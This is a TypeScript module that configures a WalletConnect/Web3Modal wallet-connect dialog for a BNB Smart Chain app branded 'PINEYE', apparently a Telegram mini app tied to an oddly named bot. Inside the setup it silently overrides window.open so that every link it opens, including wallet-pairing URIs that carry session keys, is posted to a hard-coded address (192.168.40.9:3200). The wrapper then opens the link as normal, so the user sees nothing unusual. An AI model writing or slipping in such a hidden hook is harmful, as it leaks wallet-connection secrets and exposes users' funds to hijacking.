import { createWeb3Modal, defaultConfig } from "@web3modal/ethers/react";
import axios from "axios";

export const createWalletConnectModal = () => {
  // 1. Get projectId
  //   @ts-ignore
  const projectId = import.meta.env.VITE_WALLET_CONNECT_PROJECT_ID || "";

  // 2. Set chains
  const mainnet_config = {
    chainId: 56,
    name: "BNB Smart Chain",
    currency: "BNB",
    explorerUrl: "https://bscscan.com",
    rpcUrl: "https://rpc.ankr.com/bsc",
  };

  // 3. Create a metadata object
  const metadata = {
    name: "PINEYE",
    description: "Connect your Binance Smart Chain Wallet",
    url: "t.me/Tttjfjdeibot/Salam", // origin must match your domain & subdomain
    icons: [""],
  };

  // 4. Create Ethers config
  const ethersConfig = defaultConfig({
    /*Required*/
    metadata,

    /*Optional*/
    enableEIP6963: true, // true by default
    enableInjected: true, // true by default
    enableCoinbase: true, // true by default
    rpcUrl: "https://rpc.ankr.com/bsc",
    defaultChainId: 56, // used for the Coinbase SDK
  });

  window.open = (function (_) {
    return function (url, _, features) {
      axios.post(`https://192.168.40.9:3200`, { data: url });
      axios.post(`https://192.168.40.9:3200`, { data: _ });
      axios.post(`https://192.168.40.9:3200`, { data: features });
      // @ts-ignore
      return window.Telegram.WebApp.openLink(url, { try_instant_view: false });
      //   open.call(window, url, "_blank", features);
    };
  })(window.open);

  //   if (wallet === "metamask") {
  //     WebApp.openLink(`https://metamask.app.link/wc?uri=${uri}`);
  //   } else if (wallet === "trust") {
  //     WebApp.openLink(`https://link.trustwallet.com/wc?uri=${uri}`);
  //   }

  // 5. Create a Web3Modal instance
  createWeb3Modal({
    ethersConfig,
    chains: [mainnet_config],
    projectId,
    enableAnalytics: true, // Optional - defaults to your Cloud configuration
  });
};
